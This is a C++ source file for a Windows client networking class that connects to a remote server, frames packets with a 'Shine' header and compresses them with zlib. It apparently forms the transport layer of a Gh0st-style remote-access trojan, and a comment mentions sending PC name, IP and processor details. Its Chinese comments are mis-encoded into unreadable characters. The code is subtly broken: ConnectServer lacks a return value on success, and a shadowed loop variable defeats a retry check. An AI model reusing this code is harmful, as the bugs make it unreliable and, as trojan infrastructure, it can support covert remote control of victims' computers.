#include "IOCPClient.h"
#include "zconf.h"
#include "zlib.h"


CIOCPClient::CIOCPClient()
{
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	m_ClientSocket = INVALID_SOCKET;
	m_WorkThreadHandle = NULL;

	
	m_EventHandle = CreateEvent(NULL, TRUE, FALSE, NULL);
	memcpy(m_PacketFlagData, "Shine", PACKET_FLAG_LENGTH);
	m_IsReceiving = TRUE;
}
BOOL CIOCPClient::ConnectServer(char* ServerIP, unsigned short Port)
{
	m_ClientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);    //�����
	if (m_ClientSocket == SOCKET_ERROR)
	{
		return FALSE;
	}
	//����sockaddr_in�ṹ Ҳ�������ض˵Ľṹ
	sockaddr_in	ServerAddress;
	ServerAddress.sin_family = AF_INET;               //�����  IP
	ServerAddress.sin_port = htons(Port);
	ServerAddress.sin_addr.S_un.S_addr = inet_addr(ServerIP);
	if (connect(m_ClientSocket, (SOCKADDR *)&ServerAddress, sizeof(sockaddr_in)) == SOCKET_ERROR)
	{
		if (m_ClientSocket != INVALID_SOCKET)
		{
			closesocket(m_ClientSocket);
			m_ClientSocket = INVALID_SOCKET;
		}
		return FALSE;
	}
	m_WorkThreadHandle = (HANDLE)CreateThread(NULL, 0,
		(LPTHREAD_START_ROUTINE)WorkThreadProcedure, (LPVOID)this, 0, NULL);   //��������

}

DWORD WINAPI CIOCPClient::WorkThreadProcedure(LPVOID ParameterData)
{
	CIOCPClient* This = (CIOCPClient*)ParameterData;
	
	fd_set fdOld;
	fd_set fdNew;
	FD_ZERO(&fdOld);    //��ʼ���׽�������
	FD_ZERO(&fdNew);
	char	BufferData[MAX_RECV_BUFFER] = { 0 };   //���������ڴ�

	//ѡ��ģ��

	FD_SET(This->m_ClientSocket, &fdOld);         //������ͨ���׽��ַ��뵽������

	while (This->IsReceiving())
	{
		fdNew = fdOld;
		int ReturnValue = select(NULL, &fdNew, NULL, NULL, NULL);   //�����ж��Ƿ�Ͽ�����

		if (ReturnValue == SOCKET_ERROR)  //������������
		{
			This->Disconnect();
			printf("IsReceiving �ر� \r\n");
			break;
		}
		if (ReturnValue > 0)
		{   
			//���ź�
			memset(BufferData, 0, sizeof(BufferData));
			int BufferLength = recv(This->m_ClientSocket,
				BufferData, sizeof(BufferData), 0);     //�������ض˷���������
			if (BufferLength <= 0)                      //�Է��ر��׽��� closesocket()
			{
				
				printf("WorkThreadProcedure(��������):���ض˹ر�����\r\n");
				This->Disconnect();//���մ�����
				break;
			}
			if (BufferLength > 0)
			{

				//BufferData[BufferLength] = '\0';
				//printf("%s\r\n", BufferData);
				//��������
				This->OnServerReceiving((char*)BufferData, BufferLength);   //��ȷ���վ͵��� OnRead���� ת��OnRead
			}
		}
	}
	return 0;
}





VOID CIOCPClient::Disconnect()
{
	CancelIo((HANDLE)m_ClientSocket);                        //ȡ���ڵ�ǰ�������첽����
	InterlockedExchange((LPLONG)&m_IsReceiving, FALSE);      //֪ͨ�����߳��˳����ź�
	closesocket(m_ClientSocket);                             //�ᴥ���Է�����-1����                  
	SetEvent(m_EventHandle);
	m_ClientSocket = INVALID_SOCKET;
}


CIOCPClient::~CIOCPClient()
{
	if (m_ClientSocket != INVALID_SOCKET)
	{
		closesocket(m_ClientSocket);
		m_ClientSocket = INVALID_SOCKET;
	}

	if (m_WorkThreadHandle != NULL)
	{
		CloseHandle(m_WorkThreadHandle);
		m_WorkThreadHandle = NULL;
	}

	if (m_EventHandle != NULL)
	{
		CloseHandle(m_EventHandle);
		m_EventHandle = NULL;
	}
	WSACleanup();
}
VOID CIOCPClient::OnServerReceiving(char* BufferData, ULONG BufferLength)
{
	//�ӵ������ݽ��н�ѹ��
	try
	{
		if (BufferLength == 0)
		{
			Disconnect();       //������
			return;
		}
		//���½ӵ����ݽ��н�ѹ��
		m_InCompressedBufferData.WriteArray((LPBYTE)BufferData, BufferLength);

		//��������Ƿ��������ͷ��С ��������ǾͲ�����ȷ������
		while (m_InCompressedBufferData.GetArrayLength() > PACKET_HEADER_LENGTH)
		{
			char v10[PACKET_FLAG_LENGTH] = { 0 };
			CopyMemory(v10, m_InCompressedBufferData.GetArray(), PACKET_FLAG_LENGTH);
			//�ж�����ͷ
			if (memcmp(m_PacketFlagData, v10, PACKET_FLAG_LENGTH) != 0)
			{
				throw "Bad Buffer";
			}

			ULONG PackTotalLength = 0;
			CopyMemory(&PackTotalLength, m_InCompressedBufferData.GetArray(PACKET_FLAG_LENGTH),
				sizeof(ULONG));

			//--- ���ݵĴ�С��ȷ�ж�
			if (PackTotalLength &&
				(m_InCompressedBufferData.GetArrayLength()) >= PackTotalLength)
			{

				m_InCompressedBufferData.ReadArray((PBYTE)v10, PACKET_FLAG_LENGTH);    //��ȡ����ͷ�� shine

				m_InCompressedBufferData.ReadArray((PBYTE)&PackTotalLength, sizeof(ULONG));

				ULONG DeCompressedLength = 0;
				m_InCompressedBufferData.ReadArray((PBYTE)&DeCompressedLength, sizeof(ULONG));


				ULONG CompressedLength = PackTotalLength - PACKET_HEADER_LENGTH;
				PBYTE CompressedData = new BYTE[CompressedLength];
				PBYTE DeCompressedData = new BYTE[DeCompressedLength];


				if (CompressedData == NULL || DeCompressedData == NULL)
				{
					throw "Bad Allocate";

				}

				m_InCompressedBufferData.ReadArray(CompressedData, CompressedLength);
				int	ReturnLength = uncompress(DeCompressedData,
					&DeCompressedLength, CompressedData, CompressedLength);


				if (ReturnLength == Z_OK)//�����ѹ�ɹ�
				{
					m_InDeCompressedBufferData.ClearArray();
					m_InDeCompressedBufferData.WriteArray(DeCompressedData,
						DeCompressedLength);

					//��ѹ�õ����ݺͳ��ȴ��ݸ�����Manager���д��� ע�����������˶�̬
					//����m_pManager�е����಻һ����ɵ��õ�OnReceive������һ��

					delete[] CompressedData;
					delete[] DeCompressedData;
				
					m_ManagerObject->PacketHandleIO((PBYTE)m_InDeCompressedBufferData.GetArray(0),
						m_InDeCompressedBufferData.GetArrayLength());
				}
				else
				{
					delete[] CompressedData;
					delete[] DeCompressedData;
					throw "Bad Buffer";
				}

			}
			else
				break;
		}
	}
	catch (...)
	{
		m_InCompressedBufferData.ClearArray();
		m_InDeCompressedBufferData.ClearArray();
	}

}
int CIOCPClient::OnServerSending(char* BufferData, ULONG BufferLength)  //HelloWorld
{
	m_OutCompressedBufferData.ClearArray();

	if (BufferLength > 0)
	{

		unsigned long	CompressedLength = (double)BufferLength * 1.001 + 12;   
		LPBYTE			CompressedData = new BYTE[CompressedLength];

		if (CompressedData == NULL)
		{
			return 0;
		}

		int	ReturnValue = compress(CompressedData, &CompressedLength, (PBYTE)BufferData, BufferLength);

		if (ReturnValue != Z_OK)
		{
			delete[] CompressedData;
			return FALSE;
		}

		ULONG PackTotalLength = CompressedLength + PACKET_HEADER_LENGTH;

		//[HDR_LENGTH][0.PCName.IP.ProcessorNameString..]

		m_OutCompressedBufferData.WriteArray((PBYTE)m_PacketFlagData, sizeof(m_PacketFlagData));   //Shine

		m_OutCompressedBufferData.WriteArray((PBYTE)&PackTotalLength, sizeof(ULONG));      //CompressedLength+13

		m_OutCompressedBufferData.WriteArray((PBYTE)&BufferLength, sizeof(ULONG));            //���ݳ���
		m_OutCompressedBufferData.WriteArray(CompressedData, CompressedLength);


		delete[] CompressedData;
		CompressedData = NULL;

	}

	//�ֶη�������
	return SendWithSplit((char*)m_OutCompressedBufferData.GetArray(), m_OutCompressedBufferData.GetArrayLength(),
		MAX_SEND_BUFFER);
}
BOOL CIOCPClient::SendWithSplit(char* BufferData, ULONG BufferLength, ULONG SplitLength)
{
	//1025
	int			 ReturnLength = 0;
	const char*  Travel = (char *)BufferData;
	int			 i = 0;
	ULONG		 Sended = 0;
	ULONG		 SendRetry = 15;
	int          j = 0;

	//  10                            3
	for (i = BufferLength; i >= SplitLength; i -= SplitLength)   //123 4567890
	{
		for (j = 0; j < SendRetry; j++)
		{
			ReturnLength = send(m_ClientSocket, Travel, SplitLength, 0);
			if (ReturnLength > 0)
			{
				break;
			}
		}
		if (j == SendRetry)
		{
			return FALSE;
		}

		Sended += SplitLength;   //Sended = 3
		Travel += ReturnLength;  //4567890   
		Sleep(15);
	}

	if (i > 0)  //1024
	{
		for (int j = 0; j < SendRetry; j++)   //nSendRetry = 15
		{
			ReturnLength = send(m_ClientSocket, (char*)Travel, i, 0);

			Sleep(15);
			if (ReturnLength > 0)
			{
				break;
			}
		}
		if (j == SendRetry)
		{
			return FALSE;
		}
		Sended += ReturnLength;   //0+=1000
	}
	if (Sended == BufferLength)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

